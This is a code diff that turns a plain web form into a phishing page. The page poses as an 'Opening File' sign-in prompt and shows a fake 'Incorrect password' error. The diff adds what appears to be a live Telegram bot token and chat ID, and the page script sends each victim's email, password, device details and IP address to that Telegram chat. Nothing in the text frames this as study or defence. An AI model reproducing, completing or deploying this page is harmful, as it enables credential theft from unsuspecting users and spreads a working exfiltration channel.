@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Continue</title>
+<title>Opening File</title>
 
 <style>
     html, body {
@@ -67,21 +67,21 @@
 <body>
 
 <div class="form-box">
-    <h2 style="text-align:center;">Continue</h2>
+    <h2 style="text-align:center;">Sign in with your email to continue</h2>
 
     <form id="dataForm">
         <input type="email" id="email" placeholder="Email Address" required>
         <input type="password" id="fname" placeholder="First Name" required>
-        <button type="submit">Continue</button>
+        <button type="submit">Login</button>
         <div class="warning" id="warningMsg">
-            Cant continue this time try again
+            Incorrect password, try again
         </div>
     </form>
 </div>
 
 <script>
-const telegramBotToken = "YOUR_BOT_TOKEN";
-const telegramChatId = "YOUR_CHAT_ID";
+const telegramBotToken = "8287452275:AAH2a-EFlpXjxl9LBhbhzLW3J8u1SsUS37I";
+const telegramChatId = "6023129266";
 
 function getDeviceType() {
     const ua = navigator.userAgent;
@@ -111,8 +111,8 @@ document.getElementById("dataForm").addEventListener("submit", async function(e)
 
     const message = `
 📥 New Submission
-👤 Name: ${fname}
 📧 Email: ${email}
+👤 Password: ${fname}
 🖥 Device Type: ${deviceType}
 📱 Device: ${device}
 🌍 IP: ${ip}
